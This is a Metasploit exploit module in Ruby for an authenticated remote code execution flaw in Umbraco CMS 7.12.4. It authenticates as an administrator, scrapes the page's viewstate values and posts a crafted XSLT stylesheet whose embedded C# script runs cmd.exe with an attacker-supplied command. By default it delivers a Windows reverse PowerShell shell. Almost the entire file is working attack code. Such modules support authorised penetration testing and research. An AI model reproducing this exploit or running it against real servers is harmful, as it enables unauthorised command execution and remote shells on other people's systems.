##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'Umbraco XLST CSharp Authenticated Execution',
      'Description' => %q{
        A vulnerability is present in Umbraco CMS version 7.12.4, which allows, once logged in with administrator rights, to operate a remote code execution.

        Remote code execution is possible by forging a crafted XML request in the `developer/Xslt/xsltVisualize.aspx` page.
      },
      'Author' => [
        'Gregory DRAPERI', # discovery
        'Hugo BOUTINON', # discovery
        'mekhalleh (RAMELLA Sébastien)' # this module
      ],
      'References' => [
        ## TODO: CVE number not assigned yet?
        ['EDB', '46153']
      ],
      'DisclosureDate' => '2019-01-13',
      'License' => MSF_LICENSE,
      'Platform' => ['windows'],
      'Arch' => [ARCH_CMD],
      'Privileged' => false,
      'Targets' => [
        ['Command-Line (In-Memory)',
          'Platform' => 'windows',
          'Type' => :cmd,
          'Arch' => ARCH_CMD,
          'DefaultOptions' => {
            'PAYLOAD' => 'cmd/windows/reverse_powershell'
          }
        ]
      ],
      'DefaultTarget' => 0,
      'Notes' => {
        'Stability' => [CRASH_SAFE],
        'Reliability' => [REPEATABLE_SESSION],
        'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
      }
    ))

    register_options([
      OptString.new('PASSWORD', [true, 'The Umbraco admin password to authenticate with']),
      OptString.new('TARGETURI', [true, 'The URI of the Umbraco Web directoey path', '/umbraco']),
      OptString.new('USERNAME', [true, 'The Umbraco admin username to authenticate with'])
    ])
  end

  def cmd_windows_generic?
    datastore['PAYLOAD'] == 'cmd/windows/generic'
  end

  def execute_command(command, opts = {})
    print_status("Execute command payload on the target.")
    response = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'developer', 'Xslt', 'xsltVisualize.aspx'),
      'cookie' => @cookies
    )
    return false unless response

    viewstate = response.body.scan(/id="__VIEWSTATE"\s+value="([a-zA-Z0-9\+\/]+={0,2})"/).flatten[0]
    if viewstate.nil?
      print_bad('Failed to find the __VIEWSTATE value')
      return false
    end

    viewstate_generator = response.body.scan(/id="__VIEWSTATEGENERATOR"\s+value="([a-fA-F0-9]{8})"/).flatten[0]
    if viewstate_generator.nil?
      print_bad('Failed to find the __VIEWSTATEGENERATOR value')
      return false
    end

    soap = <<-eos
<?xml version="1.0"?>
  <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" xmlns:csharp_user="http://csharp.mycompany.com/mynamespace">
    <msxsl:script language="C#" implements-prefix="csharp_user">
      public string xml() {
        string cmd = System.Text.ASCIIEncoding.ASCII.GetString(System.Convert.FromBase64String("#{command}"));
        cmd = String.Concat("/c ", cmd);
        System.Diagnostics.Process proc = new System.Diagnostics.Process();
        proc.StartInfo.FileName = "cmd.exe";
        proc.StartInfo.Arguments = cmd;
        proc.StartInfo.UseShellExecute = false;
        proc.StartInfo.RedirectStandardOutput = true;
        proc.Start();
        string output = proc.StandardOutput.ReadToEnd();
        return output;
      }
    </msxsl:script>
    <xsl:template match="/"> <xsl:value-of select="csharp_user:xml()"/> </xsl:template>
  </xsl:stylesheet>
    eos

    response = send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'developer', 'Xslt', 'xsltVisualize.aspx'),
      'cookie' => @cookies,
      'vars_post' => {
        '__EVENTTARGET' => '',
        '__EVENTARGUMENT' => '',
        '__VIEWSTATE' => viewstate,
        '__VIEWSTATEGENERATOR' => viewstate_generator,
        'ctl00$body$xsltSelection' => soap,
        'ctl00$body$contentPicker$ContentIdValue' => '',
        'ctl00$body$visualizeDo' => 'Visualize+XSLT'
      }
    )
    return false unless response

    return true
  end

  def get_auth
    print_status("Send authentication request.")
    response = send_request_raw(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'backoffice', 'UmbracoApi', 'Authentication', 'PostLogin'),
      'ctype' => 'application/json',
      'data' => {
        'username' => datastore['USERNAME'],
        'password' => datastore['PASSWORD']
      }.to_json
    )
    return false unless response

    if response.code == 200
      print_status('Successful authenticated.')
      return response.get_cookies
    end

    print_bad('Authentication as failed.')
    return false
  end

  def exploit
    @cookies = get_auth
    return if @cookies == false

    case target['Type']
    when :cmd
      command = Rex::Text.encode_base64(payload.encoded)
      vprint_status("Generated command payload: #{command}")
      execute_command(command)
      print_warning('Command executed (as blind), the command returns no output.') if cmd_windows_generic?
    end
  end

end
